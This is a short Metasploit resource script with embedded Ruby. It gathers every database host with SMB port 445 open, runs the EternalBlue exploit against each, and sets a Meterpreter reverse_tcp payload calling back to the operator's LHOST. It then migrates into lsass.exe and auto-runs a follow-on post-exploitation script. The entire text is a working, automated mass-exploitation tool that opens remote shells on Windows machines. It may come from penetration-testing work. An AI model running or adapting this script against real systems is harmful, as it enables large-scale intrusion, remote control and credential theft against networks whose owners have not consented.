set THREADS 10
setg LHOST $LHOST$
setg AutoRunScript multi_console_command -r 2_post_exploit.rc

<ruby>

port_start = 5555
#arrary for modules
modules = ["exploit/windows/smb/ms17_010_eternalblue",]

#arrary for hosts
hosts = []

framework.db.services.each do |service|
if service.port == 445
hosts << service.host.address
end
end
self.run_single("setg payload windows/meterpreter/reverse_tcp")
self.run_single("set PROCESSNAME lsass.exe")


#loop modules
modules.each do |exec|
self.run_single("use #{exec}")
puts("\nRunning Module #{exec}")

#for each host with 445 set appropriate configs and run_single
hosts.each do |rhost|
port_start += 1
self.run_single("set RHOST #{rhost}")
self.run_single("set LPORT #{port_start}")
self.run_single("exploit -j")
end
end
</ruby>
